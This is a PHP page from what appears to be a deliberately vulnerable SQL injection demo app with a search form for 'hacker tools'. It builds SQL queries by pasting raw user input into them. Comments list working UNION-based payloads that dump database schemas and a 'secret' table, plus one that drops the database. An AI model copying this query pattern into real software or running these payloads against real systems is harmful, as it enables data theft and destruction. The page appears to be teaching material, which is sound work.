<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.simplecss.org/simple.min.css">
    <title>SQLI</title>
</head>
<body style="display: flex; flex-direction: column; justify-content: center; align-items: center">

<h1>SQLI</h1>

<form action="logout.php" method="post">
    <button type="submit">Logout</button>
</form>

<?php

require_once "constants.php";
require_once "utils.php";
require_once "db.php";

session_start();

if (!isset($_SESSION[USER_ID])) {
    redirect("/");
}

$db = connectToDB();

if ($db == null) {
    setcookie(LOGIN_STATUS, "internal_error");
    redirect("/");
}

$user_name_query = "SELECT name FROM user WHERE id=" . $_SESSION[USER_ID];
$user_name = $db->query($user_name_query)->fetch()["name"];

echo "<h2>Hallo $user_name</h2>"

?>

<form action="" method="post">
    <label for="search">Check if you know some hacker tools:</label>
    <input style="width: 30rem" id="search" name="search">
</form>

<style>
    table, tr, td {
        border: none;
        background-color: var(--bg);
    }
</style>

<?php

if (!isset($_POST["search"])) return;

// combination of 2 attack methods:
// Error based attacks to get number of columns for UNION to work
// UNION based attacks
//
// to get names of all databases:       0x41414141' UNION SELECT TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES GROUP BY TABLE_SCHEMA; --
// to get tables of specific db:        0x41414141' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' AND INFORMATION_SCHEMA.TABLES.TABLE_SCHEMA='sqli_demo_app'; --
// to get column names of a table:      0x41414141' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE `TABLE_SCHEMA`='sqli_demo_app' AND `TABLE_NAME`='secret'; --
// to get contents of specific column:  0x41414141' UNION SELECT message FROM secret; --
//
// Bonus: delete the database:          '; DROP DATABASE sqli_demo_app; --

$search_term = $_POST["search"];
$search_query = "SELECT name FROM tool WHERE name LIKE '%$search_term%' ORDER BY name;";
$results = $db->query($search_query)->fetchAll();

// prevent XSS
$search_term_sanitized = filter_var($search_term, FILTER_SANITIZE_FULL_SPECIAL_CHARS);

echo "<div>Results for: <b>$search_term_sanitized</b></div>";

if (count($results) === 0) {
    echo "<div>❌ No results</div>";
    return;
}

echo "<div><table style='border: none'>";

foreach ($results as $tool) {
    echo "<tr>";
    echo "<td>✅ " . $tool["name"] . "</td>";
    echo "</tr>";
}

echo "</table></div>";

?>

</body>
</html>
